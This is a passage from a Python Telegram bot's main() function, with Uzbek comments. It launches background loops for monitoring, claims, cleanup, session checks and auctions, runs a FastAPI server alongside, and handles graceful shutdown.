    monitoring_task = asyncio.create_task(monitoring_loop(bot))
    
    # Orqa fonda deferred claim loop ni ishga tushiramiz
    deferred_task = asyncio.create_task(deferred_claim_loop(bot))
    
    # Orqa fonda DB Avto-tozalash loop ini ishga tushiramiz
    cleanup_task = asyncio.create_task(auto_cleanup_db_loop())

    # Qoldirib ketilgan bo'sh kanallarni tozalash (har 30 daqiqada)
    orphan_task = asyncio.create_task(cleanup_orphan_channels())

    # Orqa fonda Stealth mijozlarni ishga tushiramiz
    await start_stealth_clients()

    # Bot ishga tushganda raqami yo'q foydalanuvchilarning raqamlarini avtomatik to'ldiramiz
    asyncio.create_task(auto_refresh_phones())

    # Seanslar yaroqliligini tekshiruvchi fondagi loop
    session_check_task = asyncio.create_task(session_checker_loop())

    # Muddati tugagan auksionlarni avtomatik yopuvchi loop
    auction_task = asyncio.create_task(auction_close_loop(bot))

    # Aiogram bot va FastAPI parallel ishlatish
    config = uvicorn.Config(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)), log_level="warning")
    server = uvicorn.Server(config)

    # Graceful shutdown: SIGTERM va SIGINT uchun
    loop = asyncio.get_event_loop()
    bg_tasks: list[asyncio.Task] = [monitoring_task, deferred_task, session_check_task, cleanup_task, orphan_task, auction_task]

    async def _shutdown():
        logger.info("⏹ Graceful shutdown boshlandi...")
        for t in bg_tasks:
            t.cancel()
        await asyncio.gather(*bg_tasks, return_exceptions=True)
        await bot.session.close()
        logger.info("✅ Toza to'xtatildi.")

    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            loop.add_signal_handler(sig, lambda: asyncio.create_task(_shutdown()))
        except NotImplementedError:
            pass  # Windows da signal_handler ishlamaydi, lekin Railway Linux da ishlaydi

    await asyncio.gather(
        dp.start_polling(bot),
        server.serve()
    )

if __name__ == "__main__":
    asyncio.run(main())
